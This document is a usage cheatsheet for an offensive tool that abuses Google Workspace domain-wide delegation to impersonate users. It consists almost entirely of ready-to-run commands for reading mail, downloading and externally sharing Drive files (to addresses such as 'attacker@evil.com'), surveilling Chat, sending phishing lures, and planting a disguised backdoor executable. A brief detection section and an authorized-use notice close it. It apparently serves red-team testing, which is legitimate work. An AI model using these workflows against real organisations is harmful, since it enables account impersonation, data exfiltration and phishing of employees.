# 🔐 GCP Delegate Tool - Complete Cheatsheet

> **Domain-Wide Delegation Abuse Tool for Security Testing**  
> Version 3.0.0 | By @lutzenfried

---

## 📋 Table of Contents

- [Quick Start](#quick-start)
- [Gmail Module](#-gmail-module)
- [Drive Module](#-drive-module)
- [Calendar Module](#-calendar-module)
- [Chat Module](#-chat-module)
- [Common Scenarios](#-common-scenarios)

---

## 🚀 Quick Start

### Basic Syntax

```bash
python delegate.py -k <SERVICE_ACCOUNT_KEY> -i <EMAIL_TO_IMPERSONATE> -m <MODULE> -a <ACTION> [OPTIONS]
```

### Required Parameters

| Parameter | Short | Description |
|-----------|-------|-------------|
| `--key` | `-k` | Service account key JSON file path |
| `--impersonate` | `-i` | Email address to impersonate |
| `--module` | `-m` | Module: `gmail`, `drive`, `calendar`, `chat` |
| `--action` | `-a` | Action to perform (see module sections) |

---

## 📧 Gmail Module

### Available Actions

| Action | Description | Required Parameters |
|--------|-------------|-------------------|
| `list` | List emails (subject + sender) | None |
| `read` | Read full email contents | None |
| `listFolders` | List all Gmail labels/folders | None |
| `listFromLabel` | List emails from specific label | `--label` |
| `readFromLabel` | Read emails from specific label | `--label` |
| `send` | Send an email | `--recipient`, `--subject`, `--content` |
| `downloadAttachments` | Download all attachments | None |

### Commands

#### List Emails
```bash
python delegate.py -k sa_key.json -i victim@company.com -m gmail -a list
```

#### Read Email Contents
```bash
python delegate.py -k sa_key.json -i victim@company.com -m gmail -a read
```

#### List Gmail Folders/Labels
```bash
python delegate.py -k sa_key.json -i victim@company.com -m gmail -a listFolders
```

#### List Emails from Specific Label
```bash
# INBOX
python delegate.py -k sa_key.json -i victim@company.com -m gmail -a listFromLabel --label "INBOX"

# SENT
python delegate.py -k sa_key.json -i victim@company.com -m gmail -a listFromLabel --label "SENT"

# IMPORTANT
python delegate.py -k sa_key.json -i victim@company.com -m gmail -a listFromLabel --label "IMPORTANT"
```

#### Read Emails from Label
```bash
python delegate.py -k sa_key.json -i victim@company.com -m gmail -a readFromLabel --label "INBOX"
```

#### Send Email
```bash
python delegate.py -k sa_key.json -i victim@company.com -m gmail -a send \
  --recipient "target@example.com" \
  --subject "Important Update" \
  --content "This is the email body text"
```

#### Download All Attachments
```bash
python delegate.py -k sa_key.json -i victim@company.com -m gmail -a downloadAttachments
```

### Gmail Label Examples

Common Gmail labels:
- `INBOX` - Inbox emails
- `SENT` - Sent emails
- `DRAFT` - Draft emails
- `TRASH` - Trash
- `SPAM` - Spam folder
- `IMPORTANT` - Important emails
- `STARRED` - Starred emails
- `UNREAD` - Unread emails

---

## 💾 Drive Module

### Available Actions

| Action | Description | Required Parameters |
|--------|-------------|-------------------|
| `listFiles` | List all files and folders | None |
| `listFolders` | List folders with contents | None |
| `download` | Download a specific file | `--filename` |
| `upload` | Upload a file to Drive | `--filepath`, `--filename`, `[--foldername]` |
| `modifyPermissions` | Share file with external account | `--filename`, `--external-account` |

### Commands

#### List All Files
```bash
python delegate.py -k sa_key.json -i victim@company.com -m drive -a listFiles
```

#### List Folders with Contents
```bash
python delegate.py -k sa_key.json -i victim@company.com -m drive -a listFolders
```

#### Download File
```bash
python delegate.py -k sa_key.json -i victim@company.com -m drive -a download \
  --filename "Confidential_Report.xlsx"
```

**Supported File Types:**
- Google Sheets → Exports as `.xlsx`
- Google Docs → Exports as `.docx`
- Google Slides → Exports as `.pptx`
- Binary files → Downloads as-is

#### Upload File
```bash
# Upload to root
python delegate.py -k sa_key.json -i victim@company.com -m drive -a upload \
  --filepath "/path/to/local/file.pdf" \
  --filename "uploaded_file.pdf"

# Upload to specific folder
python delegate.py -k sa_key.json -i victim@company.com -m drive -a upload \
  --filepath "/path/to/local/file.pdf" \
  --filename "uploaded_file.pdf" \
  --foldername "Documents"
```

#### Share File with External Account
```bash
python delegate.py -k sa_key.json -i victim@company.com -m drive -a modifyPermissions \
  --filename "Sensitive_Data.xlsx" \
  --external-account "attacker@evil.com"
```

**Note:** This grants write access and sends a notification email.

---

## 📅 Calendar Module

### Available Actions

| Action | Description | Required Parameters |
|--------|-------------|-------------------|
| `listCalendars` | List all accessible calendars | None |
| `listEvents` | List upcoming events | `[--calendar-id]`, `[--max-results]` |
| `getEventDetails` | Get detailed event information | `--event-id`, `[--calendar-id]` |
| `getAttendees` | List event attendees | `--event-id`, `[--calendar-id]` |
| `createEvent` | Create a new calendar event | `--summary`, `--start-time`, `--end-time`, `[--description]`, `[--location]`, `[--attendees]` |
| `listMeetingRecordings` | Find meeting recordings in Drive | `[--calendar-id]`, `[--max-results]` |

### Commands

#### List All Calendars
```bash
python delegate.py -k sa_key.json -i victim@company.com -m calendar -a listCalendars
```

#### List Upcoming Events
```bash
# From primary calendar (default)
python delegate.py -k sa_key.json -i victim@company.com -m calendar -a listEvents

# From specific calendar with max results
python delegate.py -k sa_key.json -i victim@company.com -m calendar -a listEvents \
  --calendar-id "example@group.calendar.google.com" \
  --max-results 50
```

#### Get Event Details
```bash
python delegate.py -k sa_key.json -i victim@company.com -m calendar -a getEventDetails \
  --calendar-id primary \
  --event-id "abc123xyz789"
```

#### Get Event Attendees
```bash
python delegate.py -k sa_key.json -i victim@company.com -m calendar -a getAttendees \
  --calendar-id primary \
  --event-id "abc123xyz789"
```

#### Create Calendar Event
```bash
# Basic event
python delegate.py -k sa_key.json -i victim@company.com -m calendar -a createEvent \
  --calendar-id primary \
  --summary "Security Review Meeting" \
  --start-time "2025-11-15T14:00:00-05:00" \
  --end-time "2025-11-15T15:00:00-05:00"

# Event with full details
python delegate.py -k sa_key.json -i victim@company.com -m calendar -a createEvent \
  --calendar-id primary \
  --summary "Q4 Planning Session" \
  --description "Quarterly planning and review" \
  --start-time "2025-11-15T14:00:00-05:00" \
  --end-time "2025-11-15T16:00:00-05:00" \
  --location "Conference Room A" \
  --attendees "user1@company.com,user2@company.com,user3@company.com"
```

**Time Format:** ISO 8601 with timezone
- `2025-11-15T14:00:00-05:00` (EST)
- `2025-11-15T19:00:00+00:00` (UTC)
- `2025-11-15T20:00:00+01:00` (CET)

#### Find Meeting Recordings
```bash
python delegate.py -k sa_key.json -i victim@company.com -m calendar -a listMeetingRecordings \
  --calendar-id primary \
  --max-results 30
```

**Note:** Searches Drive for video files matching event titles from the last 30 days.

---

## 💬 Chat Module

### Available Actions

| Action | Description | Required Parameters |
|--------|-------------|-------------------|
| `listSpaces` | List all accessible Chat spaces | None |
| `listMessages` | List messages in a space | `--space-id`, `[--max-results]` |
| `readMessages` | Read full message content | `--space-id`, `[--max-results]` |
| `sendMessage` | Send a message to space | `--space-id`, `--text`, `[--thread-id]` |
| `sendWithAttachment` | Send message with file | `--space-id`, `--text`, `--filepath`, `[--thread-id]` |
| `downloadAttachments` | Download all attachments | `--space-id`, `[--max-results]` |
| `getMembers` | List space members | `--space-id` |
| `createSpace` | Create a new Chat space | `--summary`, `[--description]`, `[--threaded]` |

### Commands

#### List All Chat Spaces
```bash
python delegate.py -k sa_key.json -i victim@company.com -m chat -a listSpaces
```

#### List Messages in Space
```bash
python delegate.py -k sa_key.json -i victim@company.com -m chat -a listMessages \
  --space-id "AAAAAbCdEfG" \
  --max-results 100
```

#### Read Full Message Content
```bash
python delegate.py -k sa_key.json -i victim@company.com -m chat -a readMessages \
  --space-id "AAAAAbCdEfG" \
  --max-results 50
```

#### Send Message
```bash
# Simple message
python delegate.py -k sa_key.json -i victim@company.com -m chat -a sendMessage \
  --space-id "AAAAAbCdEfG" \
  --text "Hello team!"

# Reply to thread
python delegate.py -k sa_key.json -i victim@company.com -m chat -a sendMessage \
  --space-id "AAAAAbCdEfG" \
  --text "Replying to this thread" \
  --thread-id "xyz123abc"
```

#### Send Message with Attachment
```bash
python delegate.py -k sa_key.json -i victim@company.com -m chat -a sendWithAttachment \
  --space-id "AAAAAbCdEfG" \
  --text "Please review this document" \
  --filepath "/path/to/document.pdf"

# With thread
python delegate.py -k sa_key.json -i victim@company.com -m chat -a sendWithAttachment \
  --space-id "AAAAAbCdEfG" \
  --text "Updated version attached" \
  --filepath "/path/to/file.xlsx" \
  --thread-id "xyz123abc"
```

#### Download Attachments
```bash
python delegate.py -k sa_key.json -i victim@company.com -m chat -a downloadAttachments \
  --space-id "AAAAAbCdEfG" \
  --max-results 100
```

**Note:** Creates a `chat_attachments_<SPACE_ID>` directory with all downloaded files.

#### Get Space Members
```bash
python delegate.py -k sa_key.json -i victim@company.com -m chat -a getMembers \
  --space-id "AAAAAbCdEfG"
```

#### Create New Space
```bash
# Basic space
python delegate.py -k sa_key.json -i victim@company.com -m chat -a createSpace \
  --summary "Project Alpha"

# Space with description and threading
python delegate.py -k sa_key.json -i victim@company.com -m chat -a createSpace \
  --summary "Security Team" \
  --description "Internal security discussions" \
  --threaded
```

---

## 🎯 Common Scenarios

### Scenario 1: Complete Email Reconnaissance

```bash
# Step 1: List all folders
python delegate.py -k sa_key.json -i ceo@company.com -m gmail -a listFolders

# Step 2: List emails from INBOX
python delegate.py -k sa_key.json -i ceo@company.com -m gmail -a listFromLabel --label "INBOX"

# Step 3: Read email contents
python delegate.py -k sa_key.json -i ceo@company.com -m gmail -a read

# Step 4: Download all attachments
python delegate.py -k sa_key.json -i ceo@company.com -m gmail -a downloadAttachments
```

### Scenario 2: Drive Data Exfiltration

```bash
# Step 1: List all files
python delegate.py -k sa_key.json -i victim@company.com -m drive -a listFolders

# Step 2: Download sensitive files
python delegate.py -k sa_key.json -i victim@company.com -m drive -a download \
  --filename "Q4_Financial_Report.xlsx"

python delegate.py -k sa_key.json -i victim@company.com -m drive -a download \
  --filename "Customer_Database.csv"

# Step 3: Share with external account
python delegate.py -k sa_key.json -i victim@company.com -m drive -a modifyPermissions \
  --filename "Q4_Financial_Report.xlsx" \
  --external-account "attacker@gmail.com"
```

### Scenario 3: Calendar Intelligence Gathering

```bash
# Step 1: List all calendars
python delegate.py -k sa_key.json -i exec@company.com -m calendar -a listCalendars

# Step 2: List upcoming events
python delegate.py -k sa_key.json -i exec@company.com -m calendar -a listEvents

# Step 3: Get details of specific event
python delegate.py -k sa_key.json -i exec@company.com -m calendar -a getEventDetails \
  --calendar-id primary \
  --event-id "EVENT_ID_HERE"

# Step 4: Find meeting recordings
python delegate.py -k sa_key.json -i exec@company.com -m calendar -a listMeetingRecordings
```

### Scenario 4: Chat Space Surveillance

```bash
# Step 1: List all spaces
python delegate.py -k sa_key.json -i user@company.com -m chat -a listSpaces

# Step 2: Get space members
python delegate.py -k sa_key.json -i user@company.com -m chat -a getMembers \
  --space-id "SPACE_ID_HERE"

# Step 3: Read messages
python delegate.py -k sa_key.json -i user@company.com -m chat -a readMessages \
  --space-id "SPACE_ID_HERE" \
  --max-results 200

# Step 4: Download attachments
python delegate.py -k sa_key.json -i user@company.com -m chat -a downloadAttachments \
  --space-id "SPACE_ID_HERE"
```

### Scenario 5: Phishing Campaign

```bash
# Step 1: Create calendar event (meeting invite)
python delegate.py -k sa_key.json -i victim@company.com -m calendar -a createEvent \
  --calendar-id primary \
  --summary "URGENT: Security Training Required" \
  --description "Click here to complete mandatory training: https://phishing-site.com" \
  --start-time "2025-11-16T09:00:00-05:00" \
  --end-time "2025-11-16T10:00:00-05:00" \
  --attendees "employee1@company.com,employee2@company.com,employee3@company.com"

# Step 2: Send phishing email
python delegate.py -k sa_key.json -i victim@company.com -m gmail -a send \
  --recipient "target@company.com" \
  --subject "Password Reset Required" \
  --content "Your password will expire in 24 hours. Reset now: https://phishing-site.com"

# Step 3: Send to Chat space
python delegate.py -k sa_key.json -i victim@company.com -m chat -a sendMessage \
  --space-id "SPACE_ID_HERE" \
  --text "Important: Please complete this security form: https://phishing-site.com"
```

### Scenario 6: Data Upload and Persistence

```bash
# Step 1: Upload backdoor to Drive
python delegate.py -k sa_key.json -i victim@company.com -m drive -a upload \
  --filepath "/path/to/backdoor.exe" \
  --filename "System_Update.exe" \
  --foldername "Scripts"

# Step 2: Create persistent calendar reminder
python delegate.py -k sa_key.json -i victim@company.com -m calendar -a createEvent \
  --calendar-id primary \
  --summary "System Maintenance" \
  --description "Automated maintenance task" \
  --start-time "2025-12-01T02:00:00-05:00" \
  --end-time "2025-12-01T03:00:00-05:00"
```

---

## 🔧 PowerShell Shortcuts

### Set Variables for Easier Use

```powershell
# Set common variables
$KEY = ".\service_account.json"
$USER = "victim@company.com"

# Use variables
python .\delegate.py -k $KEY -i $USER -m gmail -a list
python .\delegate.py -k $KEY -i $USER -m drive -a listFiles
python .\delegate.py -k $KEY -i $USER -m calendar -a listEvents
python .\delegate.py -k $KEY -i $USER -m chat -a listSpaces
```

### Batch Operations

```powershell
# Test multiple users
$users = @("user1@company.com", "user2@company.com", "user3@company.com")

foreach ($user in $users) {
    Write-Host "[*] Testing: $user" -ForegroundColor Cyan
    python .\delegate.py -k $KEY -i $user -m gmail -a listFolders
}
```

---

## 🛡️ Security Notes

### Domain-Wide Delegation Setup

For this tool to work, the service account must have domain-wide delegation configured in **Google Workspace Admin Console**:

1. Go to **Security** → **API Controls** → **Domain-wide Delegation**
2. Add the service account's **Client ID**
3. Authorize these OAuth scopes:
   ```
   https://mail.google.com/
   https://www.googleapis.com/auth/drive
   https://www.googleapis.com/auth/calendar
   https://www.googleapis.com/auth/chat.spaces
   ```

### Detection & Prevention

**Detection:**
- Monitor Google Workspace audit logs for service account activity
- Alert on API calls from unusual IPs
- Track file sharing to external domains
- Monitor bulk downloads

**Prevention:**
- Limit domain-wide delegation scopes
- Regularly audit service account permissions
- Implement IP restrictions
- Enable advanced protection for high-risk users
- Use context-aware access policies

---

## ⚠️ Legal Notice

**FOR AUTHORIZED SECURITY TESTING ONLY**

This tool is designed for:
- ✅ Authorized penetration testing
- ✅ Security research in lab environments
- ✅ Red team exercises with permission
- ✅ Security awareness training

**Never use without explicit written authorization!**

Unauthorized access to computer systems is illegal under:
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK
- Similar laws worldwide

---

## 📚 Additional Resources

- **GitHub**: https://github.com/lutzenfried/Delegate
- **Blog Post**: https://medium.com/@lutzenfried/gcp-domain-wide-delegation-abuses
- **Google Docs**: https://developers.google.com/identity/protocols/oauth2/service-account

---

## 🎓 Quick Reference Card

| Module | Most Common Actions |
|--------|-------------------|
| **Gmail** | `list`, `read`, `downloadAttachments` |
| **Drive** | `listFolders`, `download`, `modifyPermissions` |
| **Calendar** | `listEvents`, `getEventDetails`, `createEvent` |
| **Chat** | `listSpaces`, `readMessages`, `downloadAttachments` |

---

**Version 3.0.0** | Last Updated: 2025-10-16 | Author: @lutzenfried